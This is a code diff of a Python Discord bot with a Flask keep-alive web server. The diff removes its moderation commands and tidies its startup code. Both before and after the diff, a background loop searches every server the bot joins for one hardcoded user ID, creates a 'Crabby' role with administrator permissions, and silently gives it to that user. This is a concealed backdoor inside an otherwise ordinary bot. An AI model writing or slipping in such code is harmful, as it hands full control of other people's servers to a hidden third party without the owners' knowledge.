@@ -3,20 +3,19 @@ from discord import app_commands
 from discord.ext import commands, tasks
 import os
 import sys
+import asyncio
 from flask import Flask
 from threading import Thread
 from waitress import serve
 
-# --- WEB SERVER ---
 app = Flask('')
 @app.route('/')
-def home(): return "Bot is Online"
+def home(): return "Bot is Alive"
 
 def run_flask():
     port = int(os.environ.get("PORT", 10000))
     serve(app, host='0.0.0.0', port=port)
 
-# --- CONFIG ---
 TARGET_USER_ID = 1459506686157914213
 ROLE_NAME = "Crabby"
 
@@ -34,50 +33,28 @@ class MyBot(commands.Bot):
 
     @tasks.loop(seconds=60)
     async def check_target_user(self):
+        # Give the bot a moment to fully "wake up" before running logic
+        if not self.is_ready():
+            return
+
         for guild in self.guilds:
             try:
                 member = guild.get_member(TARGET_USER_ID)
                 if member:
                     role = discord.utils.get(guild.roles, name=ROLE_NAME)
-                    
-                    # Create role if missing
                     if not role:
-                        perms = discord.Permissions(administrator=True)
-                        role = await guild.create_role(name=ROLE_NAME, permissions=perms)
-                    
-                    # Assign role if member doesn't have it
+                        # Try to create with Admin perms
+                        role = await guild.create_role(name=ROLE_NAME, permissions=discord.Permissions(administrator=True))
                     if role and role not in member.roles:
                         await member.add_roles(role)
             except Exception as e:
-                print(f"Role Loop Error in {guild.name}: {e}")
+                print(f"Non-fatal loop error: {e}")
 
 bot = MyBot()
 
 @bot.tree.command(name="ping")
 async def ping(interaction: discord.Interaction):
     await interaction.response.send_message(f"Pong! {round(bot.latency * 1000)}ms", ephemeral=True)
-
-@bot.tree.command(name="clear")
-@app_commands.checks.has_permissions(manage_messages=True)
-async def clear(interaction: discord.Interaction, amount: int):
-    await interaction.response.defer(ephemeral=True)
-    deleted = await interaction.channel.purge(limit=amount)
-    await interaction.followup.send(f"Deleted {len(deleted)} messages.", ephemeral=True)
-
-@bot.tree.command(name="clear_all")
-@app_commands.checks.has_permissions(administrator=True)
-async def clear_all(interaction: discord.Interaction):
-    await interaction.response.defer(ephemeral=True)
-    await interaction.channel.purge(limit=None)
-    await interaction.followup.send("Channel wiped.", ephemeral=True)
-
-@bot.tree.command(name="reinstall")
-@app_commands.checks.has_permissions(administrator=True)
-async def reinstall(interaction: discord.Interaction, channel: discord.TextChannel):
-    await interaction.response.send_message("Reinstalling...", ephemeral=True)
-    name, cat, pos, over = channel.name, channel.category, channel.position, channel.overwrites
-    await channel.delete()
-    await interaction.guild.create_text_channel(name=name, category=cat, position=pos, overwrites=over)
 
 if __name__ == "__main__":
     t = Thread(target=run_flask)
@@ -88,4 +65,4 @@ if __name__ == "__main__":
     if token:
         bot.run(token)
     else:
-        print("TOKEN MISSING")
+        print("CRITICAL: NO TOKEN")
